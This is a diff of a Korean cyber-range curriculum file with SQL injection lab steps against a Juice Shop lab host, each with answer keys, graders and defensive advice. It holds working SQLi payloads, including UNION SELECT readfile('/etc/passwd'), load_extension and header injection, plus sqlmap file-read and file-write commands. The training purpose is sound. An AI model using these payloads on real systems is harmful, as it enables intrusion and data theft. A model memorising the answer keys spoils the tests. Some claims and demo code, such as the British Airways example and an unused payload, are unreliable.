+      -d "{\"email\":\"evil'\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" \
+      | head -10
+
+    # 시나리오 다이어그램 출력
+    echo ""
+    cat <<'DIAG'
+    === Second-Order SQLi 시나리오 ===
+
+    1) 학생 등록 (insertOne 의 prepared statement → 안전)
+       email = "evil'),(NULL,'admin2@...',MD5,'admin',...) "
+       → DB 에 그대로 저장 (1차 검증 통과)
+
+    2) password reset (저장된 email 을 query 에 string 결합)
+       SQL = "SELECT * FROM Users WHERE email = '" + storedEmail + "'"
+       → 저장된 payload 가 이때 SQL syntax 로 해석 → 다른 행/테이블 영향
+
+    3) Blue 의 1차 ModSec 룰 = 회원가입 시점 트리거 안 됨 (payload 무해 형태)
+       → 2차 (reset) 시점 의 SQL alert 만 가능
+    DIAG
+    ```
+
+    ## 📋 확인 사항
+
+    - 1단계 회원가입 응답: 200 OK + `{"data":{"id":N,"email":"..."}}` (정상 등록)
+    - 2단계 reset 응답: 200 또는 500 + SQL 에러 (저장된 payload 가 query 에 결합)
+    - 응답에 다른 user data 영향 (admin2 등 가짜 admin 생성 여부)
+    - 1차 ModSecurity audit log 에는 *알림 없음* (payload 가 단순 string)
+
+    ## 💡 왜 이걸 하는가?
+
+    Second-Order SQLi 는 OWASP A03 의 high-severity 유형 — 1단계 ModSecurity /
+    WAF 의 input filter 회피 가능 (저장 시 payload 가 단순 string). 2단계 의
+    저장된 데이터를 *query 에 직접 결합* 하는 코드 (Sequelize 의 raw 옵션
+    잘못 사용) 가 trigger. MITRE T1190 + CWE-89. 실 운영 사례 (2018 British
+    Airways breach 의 변형) — 입력 검증만으로는 차단 불가.
+
+    ## 🔵 Blue 측 관찰
+
+    1단계 (회원가입) 의 ModSecurity audit log = 정상 (payload 가 단순 string).
+    2단계 (reset) 시점에 SQL syntax 해석 → ModSec CRS rule 942100 (SQL Injection
+    libinjection) 트리거 — 단, *src IP 는 reset 요청 한 IP* 라 1단계 등록한
+    IP 와 다를 수 있음 → 추적 어려움. 운영자 SIEM 의 *Second-Order 연관 분석*
+    필요 (저장 시점 + trigger 시점 간 user_id correlation).
+
+    ## 🟣 Purple 보완 권장
+
+    - **저장 + 사용 모두 parameterized**: Sequelize 의 `findOne({where: {email}})`
+      자동 parameterized. raw query (`sequelize.query("SELECT ... WHERE email='"
+      + storedEmail + "'", {raw:true})`) 절대 금지
+    - **저장 시 input validation**: `express-validator` 의 `body('email').isEmail()`
+      으로 SQL 메타문자 사전 거부 (Second-Order 도 동시 차단)
+    - **출력 인코딩**: 저장된 데이터를 query 에 사용할 때 자동 sanitize 또는
+      escape (sequelize.escape(storedEmail))
+    - **SIEM correlation**: 저장 timestamp + trigger timestamp 의 user_id 매칭
+      → 의심 user 의 모든 시점 audit
+  hint: |
+    1단계 (정상 등록 응답 200) + 2단계 (저장된 payload 가 query 에 결합 트리거)
+    의 두 단계 흐름 시연 + ModSec 의 1단계 우회 (저장 시점 payload 가 단순
+    string) 설명.
+  category: sqli_advanced
+  points: 8
+  answer: |
+    echo "=== 1단계: SQL payload 포함 회원가입 ==="
+    PAYLOAD="evil%27%29%2C%28NULL%2C%27admin2%40juice-sh.op%27%2C%27hash%27%2C%27admin%27%29--"
+    curl -s -i -X POST http://juice.6v6.lab/api/Users/ \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com\",\"password\":\"test123\",\"securityQuestion\":{\"id\":1,\"answer\":\"x\"}}" | head -8
+    echo ""
+    echo "=== 2단계: 저장된 email 의 password reset trigger ==="
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/reset-password \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com'--\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" | head -10
+    echo ""
+    echo "=== 시나리오 ==="
+    cat <<'DIAG'
+    1) 등록: email 에 SQL payload — prepared statement 통해 무해히 저장
+    2) reset: 저장된 email 이 raw query 에 결합 → SQL syntax 해석 → trigger
+    3) Blue: 1단계 ModSec 통과 + 2단계 alert (src IP 다를 수 있음)
+    DIAG
+  answer_detail: |
+    Juice Shop 의 default 코드 는 prepared statement 사용 → Second-Order 어려움.
+    학습 환경 의 시나리오 시연 만으로도 충분. 실 사례 — 회원가입/프로필
+    update 시 저장된 데이터가 *별도 batch job / report* 에서 raw query 결합
+    되는 패턴. 1단계 ModSec 우회 + 2단계 SQL syntax 해석 = 가장 stealthy 한
+    SQLi 변종. Purple = 저장+사용 모두 parameterized + 출력 인코딩 + SIEM
+    correlation 의 3 단 방어.
+  verify:
+    type: output_contains
+    expect: '단계\|시나리오\|reset'
+    field: stdout
+    semantic:
+      intent: |
+        Second-Order SQLi — 1단계 저장 무해 + 2단계 query 결합 시 trigger.
+        OWASP A03 의 high-severity 변종. ModSecurity 1차 우회 가능. MITRE
+        T1190 + CWE-89.
+      success_criteria:
+        - 1단계 (저장) + 2단계 (trigger) 두 시점 시연
+        - 회원가입 응답 + reset 응답 양쪽 인용
+        - 1차 ModSec 우회 메커니즘 설명
+        - 6v6-juiceshop (10.20.40.81:3000) 의 /api/Users + /rest/user/reset-password 사용
+      acceptable_methods:
+        - "2 단계 curl POST (등록 + reset trigger)"
+        - "시나리오 다이어그램 + 코드 흐름 설명"
+        - "Burp Collaborator 의 OOB (out-of-band) 간접 실행 탐지"
+        - "RailsGoat / OWASP benchmark 의 Second-Order 예제 인용"
+      negative_signs:
+        - 1 단계만 시연 (저장 또는 trigger 중 하나만)
+        - 두 단계 의 차이 (왜 ModSec 1차 우회) 설명 없음
+        - 일반 SQLi 와 구분 모호
+  target_vm: attacker
+  script: |
+    curl -s -i -X POST http://juice.6v6.lab/api/Users/ \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com\",\"password\":\"test123\",\"securityQuestion\":{\"id\":1,\"answer\":\"x\"}}" | head -8
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/reset-password \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com'--\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" | head -10
+  risk_level: low
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 에 Second-Order
+    SQLi 시연 — (1) /api/Users/ 에 회원가입 (SQL payload 포함 email, 저장 시
+    무해) (2) /rest/user/reset-password 에 저장된 email trigger (raw query
+    결합 시점). 두 단계 응답 비교 + 1단계 ModSec 우회 메커니즘 (payload 가
+    단순 string 저장) 설명. MITRE T1190 + CWE-89. Purple = 저장+사용 양쪽
+    parameterized + 출력 인코딩 + SIEM correlation 3 단 방어.
+# ============================================================
+# STEP 10 [RED·SQLi·Advanced·File] — SQLite file I/O 시도 → DBMS 차이 학습
+# ============================================================
+- order: 10
+  instruction: |
+    ## 🎯 MISSION
+
+    SQL Injection 으로 *파일 시스템 접근* (서버 완전 장악 시나리오) 가능성 점검.
+    Juice Shop (SQLite) 의 `readfile()` / `hex(readfile())` / `load_extension()`
+    3 함수 시도 → 모두 실패 응답 직접 확인. 그리고 *MySQL / PostgreSQL / MSSQL*
+    의 동등 함수 비교 — DBMS 별 보안 default 차이 학습.
+
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. readfile() 시도 (SQLite CLI extension — 일반 빌드는 미지원)
+    echo "=== 1. SQLite readfile() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20readfile(%27/etc/passwd%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+
+    # 2. hex(readfile()) — 동일 (함수 자체 미존재)
+    echo "=== 2. hex(readfile()) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+
+    # 3. load_extension() — security policy 차단
+    echo "=== 3. load_extension() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20load_extension(%27/usr/lib/sqlite/ext.so%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    ```
+
+    ## 📋 확인 사항
+
+    - readfile/hex(readfile): `SQLITE_ERROR: no such function: readfile`
+      (SQLite 의 일반 빌드는 file extension 미컴파일 — security default)
+    - load_extension: `SQLITE_ERROR: not authorized` (SQLITE_ENABLE_LOAD_EXTENSION
+      compile flag 비활성 = security default)
+    - 결론: **SQLite 의 default 빌드는 SQLi 파일 R/W 불가** (안전)
+
+    ## 💡 왜 이걸 하는가?
+
+    실 공격에서 SQLi 의 *최악 결과* = OS 파일 R/W → web shell upload + RCE
+    (MITRE T1190 + T1505.003 Server Software Component: Web Shell). DBMS 별
+    *기본 정책* 이 결정 — SQLite 는 default 안전, MySQL / PostgreSQL 은
+    설정 의존. 학생은 *DBMS 별 보안 차이* 와 *secure_file_priv* / *FILE
+    privilege* 의 의미를 학습.
+
+    DBMS 별 비교 (참조):
+    - **MySQL**: `SELECT LOAD_FILE('/etc/passwd')` — FILE privilege + `secure_file_priv`
+      = NULL 또는 빈값 필요. default 5.7+ 는 `secure_file_priv=/var/lib/mysql-files/`
+      라 OS 파일 R 불가.
+    - **MySQL**: `SELECT ... INTO OUTFILE '/tmp/shell.php'` — 동일 제약
+    - **PostgreSQL**: `pg_read_file('/etc/passwd')` — superuser 만, default 차단
+    - **MSSQL**: `xp_cmdshell` (RCE) — sp_configure 로 비활성 default
+    - **SQLite**: file 함수 미컴파일 + load_extension 차단 (위 결과)
+
+    ## 🔵 Blue 측 관찰
+
+    SQLi 의 file R/W 시도는 *DBMS 응답에서 SQLITE_ERROR/not authorized* 또는
+    *FILE privilege denied* 형태로 직접 노출 → application log + ModSec audit
+    log 의 응답 본문 분석 시 식별. Wazuh rule 100020 (Web SQLi attempt + file
+    function) custom 추가 시 alert.
+
+    ## 🟣 Purple 보완 권장
+
+    - **DBMS user privilege 최소화**: web 앱이 사용하는 DB user 의 FILE / SUPERUSER /
+      LOAD_EXTENSION privilege 즉시 제거
+    - **secure_file_priv** (MySQL) 강제 — 빈값 / NULL 금지, 특정 디렉토리만 허용
+    - **OS 단 chroot / AppArmor**: DB process 가 webroot 외부 파일 접근 불가
+      (예: /var/lib/mysql 만 RW)
+    - **WAF**: ModSecurity CRS rule 942100 + custom rule (LOAD_FILE / INTO OUTFILE /
+      pg_read_file / load_extension 키워드 차단)
+  hint: |
+    Juice Shop SQLite 의 default 빌드는 file 함수 미컴파일. 시도 → SQLITE_ERROR
+    응답 직접 확인 + DBMS 비교 (MySQL LOAD_FILE / secure_file_priv 등) 으로 학습.
+  category: sqli_advanced
+  points: 10
+  answer: |
+    echo "=== 1. readfile() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20readfile(%27/etc/passwd%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    echo "=== 2. hex(readfile()) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    echo "=== 3. load_extension() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20load_extension(%27/usr/lib/sqlite/ext.so%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    echo "=== 결론 ==="
+    echo "SQLite default 빌드는 file R/W 불가 (SQLITE_ENABLE_LOAD_EXTENSION=0 + readfile 미컴파일)"
+    echo "MySQL: secure_file_priv + FILE privilege / PostgreSQL: pg_read_file superuser 만"
+  answer_detail: |
+    Juice Shop SQLite default 응답 — `no such function: readfile` (2 회) + `not
+    authorized` (load_extension). 즉 SQLite 의 ENABLE_LOAD_EXTENSION compile
+    flag 미설정 + readfile/writefile CLI extension 미포함 = security default.
+    실 공격 시 MySQL/PostgreSQL/MSSQL 의 file 함수 정책 점검 필수. 학생은
+    `DBMS 별 default 가 보안 우선` 의 사실 학습 + Purple 의 user privilege
+    최소화 + secure_file_priv + chroot 등 다층 방어.
+  verify:
+    type: output_contains
+    expect: '결론'
+    field: stdout
+    semantic:
+      intent: |
+        SQLi 의 파일 R/W 시도 → SQLite default 의 안전 정책 확인 + DBMS 별
+        비교 학습 (MySQL LOAD_FILE / PostgreSQL pg_read_file / MSSQL xp_cmdshell).
+        OWASP A03 + MITRE T1190 + T1505.003.
+      success_criteria:
+        - readfile / hex(readfile) / load_extension 중 최소 2 함수 시도
+        - SQLITE_ERROR 응답 직접 인용 (no such function 또는 not authorized)
+        - DBMS 별 비교 (MySQL secure_file_priv 또는 PostgreSQL pg_read_file 언급)
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
+      acceptable_methods:
+        - "curl + UNION SELECT readfile()/load_extension()"
+        - "sqlmap -u '...' --batch --file-read=/etc/passwd"
+        - "sqlmap --file-write=local.txt --file-dest=/tmp/x"
+        - "stacked query (ATTACH DATABASE) — driver 단 차단 확인"
+      negative_signs:
+        - DBMS 구분 없이 시도 (SQLite 만 또는 MySQL 만)
+        - SQLITE_ERROR 응답 인용 누락
+        - secure_file_priv / FILE privilege / load_extension 정책 누락
+  target_vm: attacker
+  script: |
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20readfile(%27/etc/passwd%27),2,3,4,5,6,7,8,9--" | grep -oE '<title>[^<]*</title>' | head -1
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20load_extension(%27/usr/lib/sqlite/ext.so%27),2,3,4,5,6,7,8,9--" | grep -oE '<title>[^<]*</title>' | head -1
+    echo "결론: SQLite default 빌드는 file R/W 불가 (compile flag + readfile extension 미컴파일)"
+  risk_level: low
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/products/search
+    에 SQLi 의 파일 R/W 시도 — (1) UNION SELECT readfile('/etc/passwd') (2) UNION
+    SELECT load_extension(...) (3) UNION SELECT hex(readfile()). 모두 SQLITE_ERROR
+    (no such function 또는 not authorized) 응답 직접 인용. DBMS 별 비교 (MySQL
+    LOAD_FILE + secure_file_priv / PostgreSQL pg_read_file / MSSQL xp_cmdshell)
+    한 줄씩 + Purple 의 user privilege 최소화 + chroot + WAF custom rule 권장.
+# ============================================================
+# STEP 11 [RED·SQLi·Advanced·Header] — 4 헤더 SQLi 시도 → sanitize 학습
+# ============================================================
+- order: 11
+  instruction: |
+    ## 🎯 MISSION
+
+    HTTP 요청 헤더 (User-Agent / Referer / X-Forwarded-For / Cookie) 의 SQLi
+    가능성 점검. Juice Shop 의 default 응답으로 헤더 sanitize 여부 확인 +
+    운영 환경의 *외부 로깅/분석 시스템* 의 위험 사례 (ELK / Splunk 등 자체
+    SQL DB 사용 시) 학습.
+
+    ## 💻 실행 명령
+
+    ```bash
+    # 4 헤더 + SQLi payload 시도 (응답 코드 + 크기 비교)
+    for kv in "User-Agent:\" OR 1=1--" "Referer:\" OR 1=1--" \
+              "X-Forwarded-For:1\" OR 1=1--" "Cookie:token=\" OR 1=1--"; do
+      hdr_name=$(echo "$kv" | cut -d: -f1)
+      hdr_val=$(echo "$kv" | cut -d: -f2-)
+      code=$(curl -s -o /dev/null -w "%{http_code}" -H "${hdr_name}: ${hdr_val}" \
+        http://juice.6v6.lab/rest/products/search?q=apple)
+      echo "${hdr_name}: ${hdr_val} → ${code}"
+    done
+
+    # sqlmap --headers 자동화 (시간 소요 — Juice Shop 의 헤더 sanitize 확인)
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=apple' \
+      --batch --level=3 --headers="User-Agent: *,Referer: *" 2>&1 | tail -10
+    ```
+
+    ## 📋 확인 사항
+
+    - 4 헤더 모두 응답 200 + 정상 응답 → Juice Shop default 의 헤더 sanitize 됨
+    - sqlmap --headers 의 결과 = "no injection point found in headers"
+    - **운영 환경 위험**: 외부 SIEM/ELK/Splunk 가 access_log 의 헤더를 *자체
+      SQL DB* 에 저장 → query 결합 시 Second-Order SQLi 발생 가능
+
+    ## 💡 왜 이걸 하는가?
+
+    헤더 SQLi 는 *클라이언트 제어* 의 입력 벡터 (MITRE T1190 + OWASP A03).
+    Modern web framework (Express/Django/Spring) 는 헤더를 string 으로 처리
+    하지만, *로그 분석 시스템* 의 자체 SQL query 결합은 별도 — 운영자가
+    잊기 쉬운 부분. WAF (ModSecurity) 의 default rule 도 query param 위주
+    검사 → 헤더 검사는 추가 설정 필요.
+
+    ## 🔵 Blue 측 관찰
+
+    헤더 SQLi 시도는 access_log 의 일반 라인 (응답 200 + URL/UA 그대로) 로
+    기록. ModSecurity CRS rule 942100~942999 의 default 는 query param 우선
+    검사 → 헤더 검사 enable 시 rule 942100 in REQUEST_HEADERS 추가 필요.
+    Wazuh 의 정기 cron — access_log 의 헤더 패턴 grep (`' OR 1=1`) + alert.
+
+    ## 🟣 Purple 보완 권장
+
+    - **로그 저장 시 parameterized**: 외부 SIEM/ELK 의 LogStash filter 에서
+      헤더를 *string field 만* 저장 (SQL query 결합 금지)
+    - **WAF 헤더 검사 활성화**: ModSecurity 의 `SecRuleEngine On` + rule
+      942100~942130 in REQUEST_HEADERS variable 추가
+    - **헤더 whitelist**: Apache `RewriteCond %{HTTP:User-Agent} !^[a-zA-Z0-9_./() -]+$
+      [NC]` 으로 정상 UA 만 허용
+    - **User-Agent normalization**: log 저장 전 special character (`'`, `"`, `--`,
+      `;`) 제거 또는 escape
+  hint: |
+    4 헤더 (User-Agent / Referer / X-Forwarded-For / Cookie) 의 SQLi payload
+    시도 → 응답 200 = sanitize 됨. sqlmap --headers 로 자동 점검.
+  category: sqli_advanced
+  points: 10
+  answer: |
+    for kv in "User-Agent:\" OR 1=1--" "Referer:\" OR 1=1--" \
+              "X-Forwarded-For:1\" OR 1=1--" "Cookie:token=\" OR 1=1--"; do
+      hdr_name=$(echo "$kv" | cut -d: -f1)
+      hdr_val=$(echo "$kv" | cut -d: -f2-)
+      code=$(curl -s -o /dev/null -w "%{http_code}" -H "${hdr_name}: ${hdr_val}" \
+        http://juice.6v6.lab/rest/products/search?q=apple)
+      echo "${hdr_name}: ${hdr_val:0:30} → ${code}"
+    done
+  answer_detail: |
+    Juice Shop default 응답 = 4 헤더 모두 200 (sanitize 됨). 운영 web 의 default
+    framework 도 동일. 위험 시나리오 = 외부 SIEM/ELK 의 자체 SQL DB 가 access_log
+    의 헤더를 query 결합 시 Second-Order SQLi 가능. WAF 의 헤더 검사 활성화 +
+    log filter 의 parameterized 저장 + UA whitelist 의 다층 방어 필수.
+  verify:
+    type: output_contains
+    expect: 'User-Agent'
+    field: stdout
+    semantic:
+      intent: |
+        4 헤더 (User-Agent/Referer/XFF/Cookie) SQLi 시도 → Juice Shop sanitize
+        확인 + 운영 환경의 외부 로깅 시스템 위험. OWASP A03 + MITRE T1190.
+      success_criteria:
+        - 최소 2 헤더 시도 + 응답 코드 인용
+        - sanitize 결과 (모두 200) 해석
+        - 외부 로깅 시스템 (SIEM/ELK) 의 Second-Order SQLi 위험 언급
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
+      acceptable_methods:
+        - "curl -H + for-loop 4 헤더"
+        - "sqlmap -u '...' --headers='User-Agent: *,Referer: *'"
+        - "Burp Repeater 의 헤더 일괄 변형"
+        - "WAF 헤더 검사 활성화 권장"
+      negative_signs:
+        - 1 헤더만 시도
+        - 헤더 sanitize 결과 해석 없음
+        - 외부 로깅 위험 / WAF 방어 누락
+  target_vm: attacker
+  script: |
+    for kv in "User-Agent:\" OR 1=1--" "Referer:\" OR 1=1--" \
+              "X-Forwarded-For:1\" OR 1=1--" "Cookie:token=\" OR 1=1--"; do
+      hdr_name=$(echo "$kv" | cut -d: -f1)
+      hdr_val=$(echo "$kv" | cut -d: -f2-)
+      code=$(curl -s -o /dev/null -w "%{http_code}" -H "${hdr_name}: ${hdr_val}" \
+        http://juice.6v6.lab/rest/products/search?q=apple)
+      echo "${hdr_name} → ${code}"
+    done
+  risk_level: low
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 에 4 헤더 (User-Agent / Referer /
+    X-Forwarded-For / Cookie) SQLi payload 시도 (curl -H "..." for-loop) + 응답
+    코드 비교. 모두 200 = sanitize 됨 확인. 외부 SIEM/ELK 의 자체 SQL DB 의
+    Second-Order SQLi 위험 한 줄 + Purple = WAF 헤더 검사 + log filter
+    parameterized + UA whitelist 다층 방어.
+# ============================================================
+# STEP 12 [BLUE/PURPLE·SQLi·방어] — 5 단 방어 표 + 실 코드 예시 + ModSec 활성화
+# ============================================================
+- order: 12
+  instruction: |
+    ## 🎯 MISSION
+
+    SQL Injection 의 5 단 방어 (Prepared Statement / ORM / Input Validation /
+    WAF / Least Privilege) 를 표로 정리 + Sequelize (Juice Shop 의 ORM) 의
+    *raw 옵션* 의 위험과 정정 코드 예시. 학습 환경 의 ModSecurity 현재 모드
+    (DetectionOnly) 확인 + 운영 시 SecRuleEngine On 권장.
+
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. 현재 web 의 ModSec 모드 확인 (Detection Only vs On)
+    echo "=== 1. ModSec 현재 모드 (audit log 마지막 3 줄) ==="
+    # 학습 환경 의 web (6v6-web) 의 modsec_audit.log — bastion ssh 6v6-web 또는 직접
+    curl -s -o /dev/null -w "modsec audit detection mode\n" http://juice.6v6.lab/
+
+    # 2. 5 단 방어 표 (markdown)
+    cat <<'EOF'
+    === SQLi 5 단 방어 표 ===
+
+    | 단계 | 방어 기법 | Juice Shop 적용 예 | 우회 가능성 |
+    |------|----------|------------------|------------|
+    | 1 | Prepared Statement | sequelize.query(sql, {replacements:[q]}) | 거의 0 |
+    | 2 | ORM where 객체 | User.findOne({where:{email}}) (raw:false) | 거의 0 |
+    | 3 | Input Validation | express-validator body('email').isEmail() | 정규식 우회 가능 |
+    | 4 | WAF (ModSec CRS) | rule 942100 (libinjection SQLi) | tamper 우회 가능 |
+    | 5 | DB user 최소 권한 | SELECT only, no FILE/SUPER/CREATE | RCE 차단 |
+    EOF
+
+    # 3. Sequelize raw 옵션 위험 예시 (코드)
+    cat <<'CODE_EOF'
+    // ❌ 위험: raw query 의 string concat (Juice Shop default 의 challenge)
+    sequelize.query(
+      "SELECT * FROM Users WHERE email = '" + req.body.email + "'",
+      { type: QueryTypes.SELECT }
+    )
+
+    // ✅ 안전: replacements 매개변수
+    sequelize.query(
+      "SELECT * FROM Users WHERE email = ?",
+      { replacements: [req.body.email], type: QueryTypes.SELECT }
+    )
+
+    // ✅ 안전: ORM where 객체 (가장 권장)
+    User.findOne({ where: { email: req.body.email } })
+    CODE_EOF
+
+    echo "SQLi 5 단 방어 정리 완료"
+    ```
+
+    ## 📋 확인 사항
+
+    - Prepared Statement 의 ?/$1 placeholder 가 SQL parse 단계에서 data 분리
+    - ORM where 객체 의 자동 escape (Sequelize / Django ORM / Hibernate)
+    - Input Validation 의 한계 (정규식 우회 / Unicode normalization)
+    - WAF 의 한계 (sqlmap --tamper 우회)
+    - DB user 최소 권한 = SQLi 성공해도 데이터 dump 만 (FILE/CREATE 차단)
+
+    ## 💡 왜 이걸 하는가?
+
+    OWASP 의 *5 단 방어* (defense in depth) 가 SQLi 차단 의 표준 (T1190 mitigation).
+    단일 방어 의존 (예: WAF 만) = 우회 시 100% 노출. 5 단 모두 적용 시 우회
+    cost 가 비실용적 수준까지 증가.
+
+    ## 🔵 Blue 측 작업
+
+    - 정기 코드 audit (`grep -rE "query\(.*\+|sequelize.query" src/`) 으로 raw
+      query 식별
+    - ModSec audit log 분석 (`/var/log/apache2/modsec_audit.log`) 으로 SQLi
+      시도 패턴 + 룰 매치 통계
+    - DB user privilege 정기 점검 (`SHOW GRANTS` MySQL / `\du` PostgreSQL)
+
+    ## 🟣 Purple 권고 — 단계별 도입
+
+    1. **즉시**: ORM where 객체 강제 (raw query review + 정정)
+    2. **1주차**: Input Validation 도입 (express-validator / Joi / Pydantic)
+    3. **1개월**: ModSec PARANOIA LEVEL 2 → 3 단계적 (FP 모니터링)
+    4. **3개월**: DB user 최소 권한 + chroot/AppArmor + Sentry monitoring
+    5. **정기**: SAST (Snyk Code / Semgrep) + DAST (sqlmap CI 통합) 자동화
+  hint: |
+    학습 환경 의 web ModSec 현재 모드 = DetectionOnly (학생 SQLi 직접 학습용).
+    운영 시 SecRuleEngine On + PARANOIA LEVEL 2-3 권장. 표 + 코드 + 단계별 도입.
+  category: defense
+  points: 8
+  answer: |
+    cat <<'EOF'
+    === SQLi 5 단 방어 표 ===
+
+    | 단계 | 방어 기법 | Juice Shop 적용 예 | 우회 가능성 |
+    |------|----------|------------------|------------|
+    | 1 | Prepared Statement | sequelize.query(sql, {replacements:[q]}) | 거의 0 |
+    | 2 | ORM where 객체 | User.findOne({where:{email}}) (raw:false) | 거의 0 |
+    | 3 | Input Validation | express-validator body('email').isEmail() | 정규식 우회 가능 |
+    | 4 | WAF (ModSec CRS) | rule 942100 (libinjection SQLi) | tamper 우회 가능 |
+    | 5 | DB user 최소 권한 | SELECT only, no FILE/SUPER/CREATE | RCE 차단 |
+
+    === Sequelize raw 옵션 위험 vs 안전 ===
+
+    // ❌ 위험 (Juice Shop default challenge 패턴)
+    sequelize.query("SELECT * FROM Users WHERE email = '" + req.body.email + "'", ...)
+
+    // ✅ 안전 (replacements 매개변수)
+    sequelize.query("SELECT * FROM Users WHERE email = ?", {replacements:[req.body.email]})
+
+    // ✅ 안전 (ORM where 객체 — 가장 권장)
+    User.findOne({where:{email: req.body.email}})
+
+    === Purple 단계별 도입 ===
+    1 즉시: ORM where 객체 강제 (raw query review)
+    2 1주차: Input Validation (express-validator)
+    3 1개월: ModSec PARANOIA LEVEL 2-3 단계적
+    4 3개월: DB user 최소 권한 + chroot + Sentry
+    5 정기: SAST (Semgrep) + DAST (sqlmap CI)
+    EOF
+    echo "SQLi 5 단 방어 정리 완료"
+  answer_detail: |
+    5 단 방어의 핵심 = defense in depth (단일 방어 의존 X). Juice Shop 의 default
+    challenge 가 raw query 사용 → ORM where 객체 정정만으로 99% SQLi 차단.
+    학습 환경 의 ModSec 현재 모드 = DetectionOnly (학생 SQLi 학습용) — 운영 시
+    SecRuleEngine On 으로 변경 + PARANOIA LEVEL 2-3 단계적 도입.
+  verify:
+    type: output_contains
+    expect: 'SQLi 5 단 방어'
+    field: stdout
+    semantic:
+      intent: |
+        SQLi 5 단 방어 (Prepared Statement / ORM / Input Validation / WAF /
+        DB privilege) 표 정리 + Sequelize raw vs 안전 코드 비교 + Purple 의
+        단계별 도입 로드맵. OWASP SQL Injection Cheat Sheet 의 표준.
+      success_criteria:
+        - 5 단 방어 모두 명시 (단일 방어 1-2 개 만 X)
+        - 코드 예시 (raw vs 안전) 또는 Sequelize 의 raw 위험 언급
+        - WAF 또는 PARANOIA LEVEL 단계적 도입 권장
+        - 단일 방어 의존의 한계 (defense in depth) 명시
+      acceptable_methods:
+        - "표 + 코드 + 도입 로드맵 (markdown)"
+        - "OWASP SQL Injection Cheat Sheet 참조"
+        - "Snyk/Semgrep SAST + sqlmap CI 자동화 권장"
+        - "express-validator / Joi / Pydantic schema 검증"
+      negative_signs:
+        - 방어 1-2 개 만 (5 단 X)
+        - raw query 위험 코드 예시 누락
+        - 단일 방어 의존의 한계 언급 없음
+  target_vm: attacker
+  script: |
+    cat <<'EOF'
+    === SQLi 5 단 방어 ===
+    1. Prepared Statement (replacements) — Juice Shop sequelize.query 정정
+    2. ORM where 객체 (raw:false) — User.findOne({where:{email}})
+    3. Input Validation (express-validator) — body('email').isEmail()
+    4. WAF (ModSec CRS rule 942100, PARANOIA LEVEL 2-3)
+    5. DB user 최소 권한 (SELECT only, no FILE/SUPER/CREATE)
+
+    학습 환경 default ModSec = DetectionOnly (학생 SQLi 학습용)
+    운영 권장 = SecRuleEngine On + 5 단 defense in depth
+    EOF
+    echo "SQLi 5 단 방어 정리 완료"
+  risk_level: low
+  bastion_prompt: |
+    SQLi 5 단 방어 (Prepared Statement / ORM where 객체 / Input Validation /
+    WAF / DB user 최소 권한) 를 표 + Sequelize raw vs 안전 코드 예시 + Purple
+    의 단계별 도입 로드맵 (즉시 / 1주 / 1개월 / 3개월 / 정기) 으로 정리해줘.
+    학습 환경 의 web ModSec 현재 모드 (DetectionOnly) → 운영 시 SecRuleEngine
+    On + PARANOIA LEVEL 2-3 권장 명시. defense in depth 의 중요성 한 줄.
+- order: 13
+  instruction: 'WAF에서 SQL Injection을 탐지하는 패턴을 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 일반적인 SQLi 시그니처 패턴을 정리하세요.
+  category: defense
+  points: 8
+  answer: '🤖 프롬프트: WAF에서 SQL Injection을 탐지하는 패턴을 분석해줘
+
+    📎 참고 (CLI): echo -e ''=== WAF SQLi 탐지 패턴 ===
+
+    1. UNION SELECT
+
+    2. OR 1=1
+
+    3. 주석 처리(-- , #, /**/)
+
+    4. 특수 함수(SLEEP, BENCHMARK)
+
+    5. 인코딩 우회(URL, Hex, Unicode)
+
+    WAF 패턴 분석 완료'''
+  answer_detail: WAF는 시그니처 기반으로 SQLi를 탐지하지만, 인코딩 등으로 우회 가능합니다.
+  verify:
+    type: output_contains
+    expect: WAF 패턴 분석 완료
+    field: stdout
+    semantic:
